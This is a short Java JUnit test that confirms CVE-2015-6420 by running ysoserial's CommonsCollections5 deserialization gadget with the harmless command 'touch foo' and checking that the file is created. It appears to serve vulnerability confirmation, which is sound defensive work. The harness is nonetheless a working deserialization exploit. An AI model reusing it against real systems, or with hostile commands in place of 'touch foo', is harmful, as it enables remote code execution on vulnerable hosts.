import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.condition.*;
import ysoserial.payloads.CommonsCollections5;
import ysoserial.payloads.util.PayloadRunner;
import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import static org.junit.jupiter.api.Assertions.assertTrue;

public class ConfirmVulnerabilitiesTests {

    @BeforeEach
    public void clearGeneratedFile() {
        File file = new File("foo");
        if (file.exists()) {
            Assumptions.assumeTrue(file.delete());
        }
    }

    @Test
    @EnabledOnOs({OS.MAC,OS.LINUX})
    @EnabledOnJre(JRE.JAVA_8)
    public void confirmCVE20156420 () throws Exception {
        Path generatedFile = new File("foo").toPath();
        Assumptions.assumeFalse(Files.exists(generatedFile));

        // see also https://github.com/frohoff/ysoserial/issues/65 why CommonsCollections1 may not work
        PayloadRunner.run(CommonsCollections5.class,new String[] {"touch foo"});

        Thread.sleep(1000);  // wait for external (async)  process to create the file
        assertTrue(Files.exists(generatedFile));
    }
}
